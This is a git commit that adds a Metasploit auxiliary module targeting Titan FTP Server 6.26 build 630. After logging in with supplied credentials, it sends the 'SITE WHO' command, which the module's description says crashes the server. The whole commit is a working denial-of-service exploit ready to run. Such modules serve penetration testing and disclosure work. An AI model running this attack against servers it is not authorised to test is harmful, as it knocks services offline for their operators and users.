6cfdb104c47c833aa8dd9f15db60a89cf1dbc476
Ramon de C Valle <rcvalle@live.com>
2008-10-15 04:23:05 +0000

    Added titan626_site.rb module from Kris Katterjohn
    git-svn-id: file:///home/svn/framework3/trunk@5755 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/ftp/titan626_site.rb
@@ -0,0 +1,37 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Ftp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Titan FTP Server 6.26.630 SITE WHO DoS',
+			'Description'    => %q{
+				The Titan FTP server v6.26 build 630 can be DoS'd by
+				issuing "SITE WHO".  You need a valid login so you
+				can send this command.
+			},
+			'Author'         => 'Kris Katterjohn <katterjohn@gmail.com>',
+			'License'        => MSF_LICENSE,
+			'Version'        => '1',
+			'References'     =>
+				[ [ 'URL', 'http://milw0rm.com/exploits/6753'] ],
+			'DisclosureDate' => 'Oct 14 2008'))
+
+		# They're required
+		register_options([
+			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
+			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
+		])
+	end
+
+	def run
+		connect_login
+		print_status("Sending command...")
+		raw_send("SITE WHO\r\n")
+		sleep 1
+		disconnect
+	end
+end
+
